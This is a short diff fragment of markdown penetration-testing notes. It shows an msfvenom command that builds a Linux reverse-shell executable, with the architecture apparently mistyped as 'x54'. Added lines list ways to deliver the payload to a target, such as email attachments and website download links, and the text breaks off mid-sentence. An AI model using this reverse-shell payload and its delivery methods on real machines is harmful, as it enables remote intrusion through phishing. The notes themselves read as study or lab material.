@@ -40,4 +40,8 @@ msfvenom -p linux/x54/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > createback
 ---
 ## Executing a Stageless Payload
 
-- 
+### Ways to get the payload on Target Machine
+
+- Email messages with the file attached 
+- Download link on website
+- Combined with a metasploit e
